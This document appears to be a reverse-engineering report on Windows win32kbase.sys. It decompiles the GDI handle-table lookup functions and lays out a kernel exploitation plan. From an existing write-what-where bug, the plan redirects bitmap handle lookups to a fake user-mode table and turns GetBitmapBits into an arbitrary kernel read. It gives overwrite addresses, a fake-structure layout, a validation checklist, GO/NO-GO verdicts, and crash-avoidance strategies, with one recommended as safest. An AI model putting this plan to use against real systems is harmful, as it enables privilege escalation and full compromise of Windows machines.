# GDI Handle Table Lookup Analysis - win32kbase.sys

**Binary:** win32kbase.sys (SHA256: c8d97abb67e3b0e7ce206e4d2fd6e7a1997e48ba1ef5f567ce1545ab7ac21045)
**IDA Base:** 0x1C0000000 | **Image Size:** 0x2D6000 | **Arch:** x64
**IDA PID:** 15092 | **Port:** 13345
**Context:** KTM write-what-where (8 bytes to any kernel address). Goal: redirect GDI handle lookup to user-mode fake table so GetBitmapBits reads from controlled pvScan0. SMAP disabled in win32k syscall context.

---

## Task 1: HmgShareLockCheck and HmgShareLockCheckIgnoreStockBit - Decompilation

### HmgShareLockCheck (RVA 0x2F050, VA 0x1C002F050, size 0x2C6)

```c
__int64 __fastcall HmgShareLockCheck(unsigned int a1, char a2)
{
  __int16 v3;             // HIWORD(a1) - uniqueness tag from handle
  _DWORD *v5;             // entry pointer from vLockHandle
  unsigned int v6;        // decoded 24-bit index
  unsigned __int16 *v25;  // HANDLELOCK entry pointer
  int v26;                // lock success flag

  v3 = HIWORD(a1);
  v25 = nullptr;
  v26 = 0;
  v4 = 0;

  // STEP 1: Lock the handle entry via gpHandleManager directory chain
  HANDLELOCK::vLockHandle(&v25, (uint16)a1 | (a1 >> 8) & 0xFF0000, 1, 0, 0);

  if (v26)
  {
    v5 = v25;
    // STEP 2: Validate type + uniqueness
    if (*((BYTE*)v25 + 14) == a2 && v25[6] == v3)
    // entry+0x0E==type, entry+0x0C==uniqueness
    {
      // STEP 3: Decode index and look up object through gpHandleManager
      v6 = *(_DWORD*)v25 & 0xFFFFFF;  // 24-bit index from entry+0
      if (v6 >= 0x10000) {
        if (*(_DWORD*)gpHandleManager > 0x10000u) {
          if (*(BYTE*)GdiHandleEntryDirectory::GetEntry(
                *(gpHandleManager + 2), *v25, 1) + 13 == HIWORD(v6))
            v6 = (uint16)v6;
        } else {
          v6 = *v25;
        }
      }

      // STEP 4: directory -> table -> page -> object pointer
      v7 = *(QWORD*)(gpHandleManager + 2);  // directory
      v8 = *(DWORD*)(v7 + 2056);            // base_index (offset 0x808)
      if (v6 < v8 + ((*(uint16*)(v7 + 2) + 0xFFFF) << 16)) {
        v9 = ((v6 - v8) >> 16) + 1;
        if (v6 < v8) v9 = 0;
        v10 = *(QWORD*)(v7 + 8*v9 + 8);     // table pointer
        if (v9) v6 += ((1 - v9) << 16) - v8;
        if (v6 < *(DWORD*)(v10 + 20))       // bounds check
          v4 = *(QWORD*)(*(QWORD*)(**(QWORD**)(v10 + 24) + 8*(v6 >> 8))
                         + 16*(uint8)v6 + 8);
          //     ^page_array    ^page_ptr     ^slot+8 = OBJECT POINTER
      }

      // STEP 5: Increment share reference count
      ++*(_DWORD*)(v4 + 8);  // OBJECT->cShareCount (offset +8)
    }

    // STEP 6: Unlock - THIRD lookup through same chain
    GdiHandleEntryDirectory::ReleaseEntryLock(...);
    KeLeaveCriticalRegion();
  }
  return v4;  // returns OBJECT pointer (SURFACE*)
}
```

**Key observations:**
- `a1` = raw HBITMAP (32-bit), `a2` = object type (5 = SURFACE for bitmaps)
- Transformed index: `(uint16)handle | ((handle >> 8) & 0xFF0000)` -> 24-bit
- Entry type check: `entry[0x0E] == a2` (byte at entry offset 14)
- Uniqueness check: `entry[0x0C] == HIWORD(handle)` (word at entry offset 12)
- Object pointer at: `page[16 * (uint8)idx + 8]`
- THREE full directory->table->page traversals per call (lock, object lookup, unlock)

### HmgShareLockCheckIgnoreStockBit (RVA 0x32E40, VA 0x1C0032E40, size 0x2B7)

Same structure as HmgShareLockCheck. Only difference: uniqueness check masks out bit 7 (stock bit):

```c
if (*((BYTE*)v25 + 14) == a2 && ((HIWORD(a1) ^ v25[6]) & 0xFFFFFF7F) == 0)
//                                          ^ masks bit 7 ^^^
```

Rest of the lookup chain (directory->table->page->object) is identical.

### Other Key Functions Decompiled

**HmgShareLock** (RVA 0x2FC10, size 0x1E6): Same pattern - vLockHandle then directory->table->page object lookup, then ReleaseEntryLock. Uses `*(WORD*)(v25 + 12) == v4` for uniqueness (no stock bit masking).

**HmgLock** (RVA 0x2EE50, size 0x1F5): Exclusive lock variant. After vLockHandle, does object lookup via same chain, then sets `OBJECT->thread = KeGetCurrentThread()` and increments `OBJECT->lock_count`.

**HmgValidHandle** (RVA 0x6B7C0, size 0x6F): Lightweight validation - DecodeIndex + GetEntry, checks type+uniqueness, no object pointer lookup.

**HmgShareLockIgnoreStockBit** (RVA 0x9A4B8, size 0x10C): Simplified share lock for type 5 (SURFACE) only. Same directory->table->page chain.

---

## Task 2: Which Layer Does Handle Lookup Use?

**ANSWER: Layer 2 - gpHandleManager.**

All GDI handle lookup functions (HmgShareLock, HmgShareLockCheck, HmgShareLockCheckIgnoreStockBit, HmgLock, HmgShareLockEx, HmgShareLockIgnoreStockBit, HmgValidHandle, HmgPentryFromPobj) read from `gpHandleManager` at RVA 0x250C00.

`gpKernelHandleTable` at RVA 0x24ED40 is used exclusively by **USER object** functions (HMValidateHandle, HMAllocObject, HMObjectFromHandle, etc.) for HWND/HMENU/HHOOK objects. It has nothing to do with GDI bitmap handles.

**Evidence:**
- `gpHandleManager` has 153 xrefs across ~70+ unique GDI functions (Hmg*, Eng*, NtGdi*, etc.)
- `gpKernelHandleTable` has 45 xrefs, all in HM* functions (USER object management)
- `_HMObjectFromHandle` at RVA 0x31AF0: `return *((QWORD*)gpKernelHandleTable + 3 * a1);` - flat array, 24-byte entries, index = raw handle value
- `InitKernelHandleTable` at RVA 0x29080: maps `ghSectionKernelHandleTable` into session space - completely separate from GDI handle manager

| Layer | Global | RVA | Used by | Entry size | Lookup method |
|-------|--------|-----|---------|------------|---------------|
| Layer 1 (user) | PEB.GdiSharedHandleTable | N/A | User-mode GDI32 | 32 bytes | ENCODED pointers |
| **Layer 2 (kernel)** | **gpHandleManager** | **0x250C00** | **All GDI Hmg* functions** | 24+16 bytes | **Directory->Table->Page chain** |
| Layer 3 (kernel) | gpKernelHandleTable | 0x24ED40 | USER HM* functions only | 24 bytes | Flat array `base[3*handle]` |

---

## Task 3: GdiHandleEntryTable::GetEntryObject - Full Lookup Chain

### GdiHandleManager::GetEntryObject (RVA 0x312D0, size 0x7D)

```c
OBJECT* GdiHandleManager::GetEntryObject(GdiHandleEntryDirectory **this, uint a2)
{
  v3 = GdiHandleManager::DecodeIndex(this, a2);
  v4 = *(this + 2);                               // directory at offset 0x10
  v6 = v3;
  v7 = *(DWORD*)(v4 + 2056);                      // base_index at dir+0x808
  if (v3 < v7 + ((*(uint16*)(v4 + 2) + 0xFFFF) << 16)) {
    v8 = ((v3 - v7) >> 16) + 1;
    if (v3 < v7) v8 = 0;
    v9 = *(QWORD*)(v4 + 8*v8 + 8);                // table pointer
    if (v8) v6 = ((1 - v8) << 16) - v7 + v3;      // adjust index
    if (v6 < *(DWORD*)(v9 + 20))                  // table max count
      return *(OBJECT**)(*(QWORD*)(**(QWORD**)(v9 + 24) + 8*(v6>>8))
                         + 16*(uint8)v6 + 8);
  }
  return NULL;
}
```

### GdiHandleEntryTable::GetEntryObject (RVA 0x31360, size 0x29)

```c
OBJECT* GdiHandleEntryTable::GetEntryObject(GdiHandleEntryTable *this, uint a2)
{
  if (a2 >= *(DWORD*)(this + 20))  // this+0x14 = max_count
    return NULL;
  return *(OBJECT**)(*(QWORD*)(**(QWORD**)(this + 24) + 8*(a2>>8))
                     + 16*(uint8)a2 + 8);
  //    ^page_array_ptr  ^page[idx>>8]  ^slot+8
}
```

### GdiHandleEntryDirectory::GetEntry (RVA 0x31220, size 0x9D)

```c
_ENTRY* GdiHandleEntryDirectory::GetEntry(GdiHandleEntryDirectory *this, uint a2, char a3)
{
  v4 = *(DWORD*)(this + 2056);  // base_index at dir+0x808
  if (a2 >= v4 + ((*(uint16*)(this + 2) + 0xFFFF) << 16))
    return NULL;
  v6 = ((a2 - v4) >> 16) + 1;
  if (a2 < v4) v6 = 0;
  v7 = *(QWORD*)(this + 8*v6 + 8);  // table pointer
  if (v6) a2 += ((1 - v6) << 16) - v4;
  if (a3 && a2 < *(DWORD*)(v7 + 20) || ...)
    return (ENTRY*)(*(QWORD*)v7 + 24*a2);  // entry_data + 24*index
  return NULL;
}
```

### GdiHandleManager::DecodeIndex (RVA 0x313F0, size 0x50)

```c
uint GdiHandleManager::DecodeIndex(GdiHandleEntryDirectory **this, uint a2)
{
  if (a2 >= 0x10000 &&
      (*(DWORD*)this <= 0x10000u ||
       *(BYTE*)GdiHandleEntryDirectory::GetEntry(*(this+2), (uint16)a2, 1) + 13
       == HIWORD(a2)))
    return (uint16)a2;  // truncate to 16-bit
  return a2;            // keep 24-bit
}
```

### HANDLELOCK::vLockHandle (RVA 0x30A00, size 0x254)

Critical entry lock function. Full flow:

1. `PsGetCurrentThreadWin32ThreadAndEnterCriticalRegion` - enter critical region
2. Decode index via gpHandleManager (same DecodeIndex logic)
3. Directory -> table selection (same bounds checks)
4. Page -> slot: `v36 = page + 16*(uint8)idx` - this is the push lock address
5. `KeEnterCriticalRegion()` + `ExAcquirePushLockExclusiveEx(v36, 0)` - acquire exclusive lock
6. Verify object pointer non-null: `*(QWORD*)(slot + 8) != 0`
7. Mark entry locked: `*(DWORD*)(entry_data + 24*idx + 8) |= 1`
8. Store entry pointer + read lock count
9. Owner check: if `lock_count & 0xFFFFFFFE != 0`, compare against current thread/process
10. Deletion check: `entry[0x0F] & 0x20 == 0`
11. Thread-owned check: `entry[0x0F] & 0x40 == 0` (or verify thread)

### Full Lookup Chain (exact indexing)

```
gpHandleManager (QWORD* at win32kbase+0x250C00)
  |
  +-- [0x00] DWORD: max_index_threshold (compared against 0x10000)
  +-- [0x08] (padding)
  +-- [0x10] QWORD: directory_ptr ------> GdiHandleEntryDirectory
                                        |
                                        +-- [0x02] uint16: range_component
                                        +-- [0x08] QWORD: table_ptr[0]  (slot 0)
                                        +-- [0x10] QWORD: table_ptr[1]  (slot 1)
                                        |   ...
                                        +-- [0x808] DWORD: base_index
  |
  +-- table_ptr[slot]  (slot = ((index - base) >> 16) + 1)
       |
       +-- [0x00] QWORD: entry_data_base (24-byte entries)
       |       entry[index] = entry_data_base + 24 * adjusted_index
       |       +-- [0x00] DWORD: handle (24-bit index)
       |       +-- [0x08] DWORD: lock_count (bit 0 = locked)
       |       +-- [0x0C] WORD:  uniqueness_tag (HIWORD of handle)
       |       +-- [0x0E] BYTE:  object_type (5 = SURFACE)
       |       +-- [0x0F] BYTE:  flags (bit5=deletion, bit6=thread-owned)
       |
       +-- [0x14] DWORD: max_entry_count (bounds check)
       |
       +-- [0x18] QWORD: page_array_ptr --> [QWORD* array]
                                         |
                                         +-- [index >> 8] QWORD: page_ptr --> page
                                                                               |
                                                                               +-- [16*(uint8)index + 0x00] push_lock (8 bytes)
                                                                               +-- [16*(uint8)index + 0x08] QWORD: OBJECT POINTER  <--- TARGET
```

**Index computation (step by step):**
1. `raw_24bit = (uint16)handle | ((handle >> 8) & 0xFF0000)`
2. If `raw_24bit >= 0x10000` AND `*(DWORD*)gpHandleManager <= 0x10000`: `decoded = (uint16)raw_24bit`
3. `base = *(DWORD*)(directory + 0x808)`
4. `range = (*(uint16*)(directory + 0x02) + 0xFFFF) << 16`
5. If `decoded >= base + range`: FAIL
6. `table_slot = ((decoded - base) >> 16) + 1`; if `decoded < base`: `table_slot = 0`
7. `table = *(QWORD*)(directory + 8 * table_slot + 8)`
8. If `table_slot != 0`: `adjusted = decoded + ((1 - table_slot) << 16) - base`
9. If `adjusted >= *(DWORD*)(table + 0x14)`: FAIL
10. `page = *(QWORD*)(*(QWORD*)(table + 0x18) + 8 * (adjusted >> 8))`
11. **`object = *(QWORD*)(page + 16 * (uint8)adjusted + 8)`**

### GdiHandleEntryDirectory::ReleaseEntryLock (RVA 0x30930, size 0x7F)

```c
void GdiHandleEntryDirectory::ReleaseEntryLock(GdiHandleEntryDirectory *this, uint a2)
{
  v2 = *(DWORD*)(this + 2056);  // base_index
  if (a2 < v2 + ((*(uint16*)(this + 2) + 0xFFFF) << 16)) {
    v3 = ((a2 - v2) >> 16) + 1;
    if (a2 < v2) v3 = 0;
    v4 = *(QWORD*)(this + 8*v3 + 8);  // table
    if (v3) a2 += ((1 - v3) << 16) - v2;
    *(DWORD*)(*(QWORD*)v4 + 24*a2 + 8) &= ~1u;  // clear lock bit
    ExReleasePushLockExclusiveEx(
      *(QWORD*)(**(QWORD**)(v4 + 24) + 8*(a2>>8)) + 16*(uint8)a2, 0);
    KeLeaveCriticalRegion();
  }
}
```

This is the unlock path - does the SAME directory->table->page traversal to find the push lock and release it, plus clears the lock bit in entry data.

---

## Task 4: N/A (Layer 3 is not used for GDI handles)

gpKernelHandleTable is a flat 24-byte-entry array used ONLY for USER objects:

```c
// _HMObjectFromHandle at RVA 0x31AF0:
return *((QWORD*)gpKernelHandleTable + 3 * a1);  // flat: base[3*handle]
```

GDI bitmap handles never touch gpKernelHandleTable. This layer is irrelevant to the GetBitmapBits exploit path.

---

## Task 5: Overwriting gpHandleManager - Can We Redirect ALL Handle Lookups?

### Target
- **Address:** `win32kbase_base + 0x250C00` (RVA 0x250C00)
- **Write:** 8 bytes (QWORD) replacing kernel pointer with user-mode address

### What We Need to Fake

A complete multi-level structure in user mode (SMAP disabled, kernel can read/write user memory):

| Structure | Offset in alloc | Size | Key fields |
|-----------|----------------|------|------------|
| GdiHandleManager | +0x0000 | 0x18 | [0x00]=threshold (<=0x10000), [0x10]=dir_ptr |
| GdiHandleEntryDirectory | +0x0018 | 0x810 | [0x02]=range(0), [0x10]=table_ptr, [0x808]=base(0) |
| GdiHandleEntryTable | +0x0828 | 0x20 | [0x00]=entry_data_ptr, [0x14]=max_count(0x100), [0x18]=page_array_ptr |
| Entry data (1 entry) | +0x0848 | 0x18 | [0x00]=handle, [0x08]=lock_count, [0x0C]=uniqueness, [0x0E]=type(5), [0x0F]=flags(0) |
| Page array (1 ptr) | +0x0860 | 0x08 | [0x00]=page_ptr |
| Page (1 slot) | +0x0868 | 0x10 | [0x00]=push_lock(0), [0x08]=fake_surface_ptr |
| **TOTAL** | | **0x878 (2168 bytes)** | Single VirtualAlloc |

### Critical: Table Slot Offset

For `index < 0x10000` with `base=0`: `table_slot = ((index-0)>>16)+1 = 1`. The table pointer is read from **directory + 0x10** (slot 1), NOT directory + 0x08 (slot 0). The adjustment `adjusted = index + ((1-1)<<16) - 0 = index` keeps the index unchanged.

### GO/NO-GO: **GO** (with major survival caveat - see Task 10)

---

## Task 6: Overwriting gpKernelHandleTable Instead?

**NO-GO for GDI bitmap exploitation.**

gpKernelHandleTable is used ONLY for USER objects (HWND, HMENU, HHOOK). GDI bitmap handles (HBITMAP) go through gpHandleManager. Overwriting gpKernelHandleTable would NOT affect GetBitmapBits or any GDI operation.

### GO/NO-GO: **NO-GO** (wrong table for GDI bitmap exploitation)

---

## Task 7: Address Calculations (py_eval)

```
B (win32kbase base)                = 0x00000001C0000000
gpHandleManager (B + 0x250C00)     = 0x00000001C0250C00
gpKernelHandleTable (B + 0x24ED40) = 0x00000001C024ED40

Write-what-where target for GDI:  B + 0x250C00 (overwrite 8-byte QWORD)
Write-what-where target for USER: B + 0x24ED40 (overwrite 8-byte QWORD, useless for GDI)
```

At runtime, `B` = the actual ASLR'd load address of win32kbase.sys. The RVAs 0x250C00 and 0x24ED40 are fixed relative to the module base.

Minimum fake structure: 2168 bytes (0x878) in a single contiguous VirtualAlloc.

---

## Task 8: Fields Checked During Lookup - Can We Satisfy All?

### Complete validation checklist during one HmgShareLockCheck call:

| # | Check | Location | Required Value | Satisfiable? |
|---|-------|----------|---------------|--------------|
| 1 | `*(DWORD*)gpHandleManager > 0x10000` | DecodeIndex/vLockHandle | Set <= 0x10000 for simple mode | YES |
| 2 | Directory bounds: `idx < base + ((range+0xFFFF)<<16)` | Directory lookup | base=0, range=0 covers all 16-bit | YES |
| 3 | Table slot: `slot = ((idx-base)>>16)+1` | Table selection | slot=1, table at dir+0x10 | YES |
| 4 | Table bounds: `adjusted < *(DWORD*)(table+0x14)` | Table lookup | Set max_count=0x100 | YES |
| 5 | Page exists: `page_array[adjusted>>8]` | Page selection | 1 page ptr for page 0 | YES (if idx<256) |
| 6 | Push lock: `ExAcquirePushLockExclusiveEx(slot)` | vLockHandle | Zeroed lock = unlocked | YES (SMAP off) |
| 7 | Object non-null: `*(QWORD*)(slot+8) != 0` | vLockHandle | Set to fake SURFACE ptr | YES |
| 8 | Entry lock write: `*(DWORD*)(entry+8) |= 1` | vLockHandle | Writable user memory | YES (SMAP off) |
| 9 | Type match: `entry[0x0E] == a2` | HmgShareLockCheck | Set to 5 (SURFACE) | YES |
| 10 | Uniqueness: `entry[0x0C] == HIWORD(handle)` | HmgShareLockCheck | Match actual HBITMAP | YES |
| 11 | Not deletion-pending: `entry[0x0F] & 0x20 == 0` | vLockHandle | Set flags=0 | YES |
| 12 | Not thread-owned: `entry[0x0F] & 0x40 == 0` | vLockHandle | Set flags=0 | YES |
| 13 | Owner check: `(lockcount&~1) != 0` -> skip if 0 | vLockHandle | lock_count=0 passes | YES |
| 14 | Share count increment: `++*(DWORD*)(obj+8)` | HmgShareLockCheck | Fake SURFACE+8 writable | YES (SMAP off) |
| 15 | Unlock: `*(DWORD*)(entry+8) &= ~1` + `ExReleasePushLockExclusiveEx` | ReleaseEntryLock | Same structures valid | YES |
| 16 | Reference tracking (type 5/16): reads obj+680 or obj+136 | HmgShareLockCheck | Set those offsets to NULL | YES |

**ALL 16 checks are satisfiable with a user-mode fake table when SMAP is disabled.**

### Fake SURFACE Minimum Layout

The object pointer (fake SURFACE) needs:
- `+0x08` (DWORD): cShareCount (incremented/decremented - must be writable)
- `+0x088` (offset 136): ptr for type 16 reference tracking (can be NULL)
- `+0x2A8` (offset 680): ptr for type 5 reference tracking (can be NULL)
- **pvScan0**: at the SURFACE-specific offset (verify in win32kfull.sys - typically SURFACE+0x50 area)

The critical field is **pvScan0** - GetBitmapBits reads from this pointer to copy bitmap pixel data. Pointing it at an arbitrary kernel address gives an arbitrary kernel read primitive.

---

## Task 9: Does the Handle Lookup Access User-Mode Addresses?

**YES - when SMAP is disabled.**

In win32k syscall context, SMAP is explicitly disabled. The kernel runs with the AC bit set in RFLAGS, allowing unrestricted access to user-mode pages.

Every dereference in the lookup chain works on user-mode memory:
- `*(QWORD*)gpHandleManager` -> reads our fake GdiHandleManager in user mode
- `*(QWORD*)(directory + offset)` -> reads our fake directory in user mode
- `*(QWORD*)(table + offset)` -> reads our fake table in user mode
- `ExAcquirePushLockExclusiveEx(slot)` -> acquires lock in user-mode memory (writes to it)
- `*(QWORD*)(page + offset)` -> reads object pointer from user-mode page
- `*(DWORD*)(entry + offset)` -> writes lock bit to user-mode entry data
- `++*(DWORD*)(object + 8)` -> writes share count to user-mode fake SURFACE

All are standard direct pointer dereferences. The kernel does NOT use `MmCopyVirtualMemory` or `ProbeForRead` for these - they are direct memory accesses in the handle manager hot path. SMAP being disabled means these accesses succeed without faulting.

---

## Task 10: Survival - Can We Do ONE GetBitmapBits and Survive?

### The Problem: Global Redirect

Overwriting `gpHandleManager` redirects **ALL** GDI handle lookups system-wide. 153 xrefs across 70+ functions use this pointer. Every GDI operation on every thread - cursor rendering, window painting, text drawing, brush selection, DC operations - goes through the same pointer.

### Race Condition Analysis

During the window between overwrite and restore:

1. **Our thread:** NtGdiGetBitmapBits -> HmgShareLock -> vLockHandle -> our fake table -> gets fake SURFACE -> reads pvScan0 -> returns data -> HmgShareUnlock -> releases lock via fake table -> returns. **Succeeds** if fake structures are correct.

2. **Any other thread:** Any GDI call (NtGdiBitBlt, NtGdiTextOut, cursor update, DWM composition) -> Hmg* -> vLockHandle -> our fake table -> **CRASH** because:
   - Other handle indices map to page_array entries that don't exist (only 1 page)
   - Or page slots with null object pointers
   - Or entry data doesn't exist for that index
   - Or push lock at unmapped address
   - Or type/uniqueness mismatch (entry check fails -> returns NULL -> null deref in caller)

3. **DWM/CSRSS:** Desktop Window Manager continuously does GDI operations for composition. CSRSS handles console rendering. Both hit our fake table within milliseconds.

### Survival Strategies

**Strategy A: Race the overwrite (HIGH RISK)**

1. Pre-allocate the full 2168-byte fake table in user mode
2. Populate it with the correct handle entry for our specific HBITMAP
3. Use the KTM write-what-where to overwrite gpHandleManager with our user-mode address
4. **Immediately** call GetBitmapBits from the same thread (NtGdiGetBitmapBits syscall)
5. **Immediately** restore the original gpHandleManager value using a second KTM write

The window between step 3 and step 5 is the critical race. If our thread is the highest priority thread and no DWM/CSRSS GDI operations intervene, we survive.

**Mitigations to widen the race window:**
- Set our thread to real-time priority (THREAD_PRIORITY_TIME_CRITICAL)
- Affinitize to a specific CPU core where DWM/CSRSS are less likely to run
- The vLockHandle path enters a critical region which raises IRQL - may briefly prevent context switches
- Pre-build the fake SURFACE with pvScan0 already pointing to the target kernel address

**Strategy B: Make the fake table handle ALL indices (MEDIUM RISK)**

Instead of only faking one handle entry, build a fake table that:
- Has a large page array (256 entries for all idx>>8 values 0-255)
- Each page has 256 slots (4096 bytes per page)
- Each slot has a null object pointer (causes vLockHandle to fail gracefully - returns NULL)
- Only our specific handle's slot has a non-null object pointer pointing to our fake SURFACE

Total: ~2.5MB - feasible with a single VirtualAlloc. Most other GDI ops fail gracefully (NULL returns) but some callers may not check NULL and crash.

**Strategy C: Targeted page slot overwrite (SAFEST - RECOMMENDED)**

Instead of overwriting gpHandleManager globally, use the KTM write-what-where to overwrite a SINGLE 8-byte object pointer within the real handle table's page slot:
- Compute the exact kernel address of `page + 16*(uint8)index + 8` for our specific HBITMAP
- Overwrite just that QWORD with our user-mode fake SURFACE address
- Only our bitmap handle's lookup is affected - all other GDI operations use the real table

This requires:
1. The real gpHandleManager value (leak it first)
2. The directory/table/page chain for our handle index (compute from decompiled logic)
3. The exact page slot address (traverse the real structures)

This is the safest approach: NO race condition, NO global impact, ONE targeted 8-byte write replaces exactly one object pointer.

### Verdict

**GO with Strategy C (targeted page slot overwrite) - NO race, NO survival issue.**

**GO with Strategy A (global overwrite + race) - HIGH RISK, likely crashes DWM/CSRSS within milliseconds. Only viable if you can guarantee no concurrent GDI operations (kill DWM, headless session).**

**GO with Strategy B (full fake table with null defaults) - MEDIUM RISK, most other GDI ops fail gracefully but some may crash.**

### What Happens to Other GDI Operations?

With the global gpHandleManager overwrite (Strategy A):
- **GDI calls from other threads:** Hit our fake table. If their handle index maps to a page slot with a null object pointer, vLockHandle releases the lock and returns NULL. Most GDI APIs handle this gracefully (return error). But some callers may dereference the NULL and BSOD.
- **DWM composition:** DWM calls GDI functions 60+ times per second. It will hit our fake table almost immediately. May get NULL returns (graceful, screen flickers) or NULL derefs (BSOD).
- **Cursor rendering:** Cursor blink and mouse cursor updates use GDI. These will fail.

### Can We Survive ONE GetBitmapBits?

**With Strategy A:** Theoretically yes, practically unlikely on a system with active UI. Race window is microseconds. Best chance: real-time priority + CPU affinity + kill DWM + headless session.

**With Strategy C:** Yes, guaranteed. The targeted overwrite only affects one handle. All other GDI operations use the real table unchanged. Call GetBitmapBits, read the data, then restore the original 8 bytes. No race, no crash.

---

## Summary

| Question | Answer |
|----------|--------|
| Which layer for GDI handles? | **Layer 2 (gpHandleManager, RVA 0x250C00)** |
| gpKernelHandleTable relevant? | **No - USER objects only (RVA 0x24ED40)** |
| Lookup chain | directory -> table -> page -> slot+8 = object ptr |
| Overwrite gpHandleManager? | **GO** - works with 2168-byte user-mode fake table (SMAP off) |
| Overwrite gpKernelHandleTable? | **NO-GO** - wrong table for GDI |
| All checks satisfiable? | **YES** - all 16 validation checks pass with fake structures |
| Kernel accesses user-mode? | **YES** - SMAP disabled in win32k syscall context |
| Survive one GetBitmapBits? | **Strategy C: YES (guaranteed). Strategy A: unlikely with active UI.** |
| Best approach | **Strategy C: targeted page slot overwrite (single 8-byte write, no race)** |
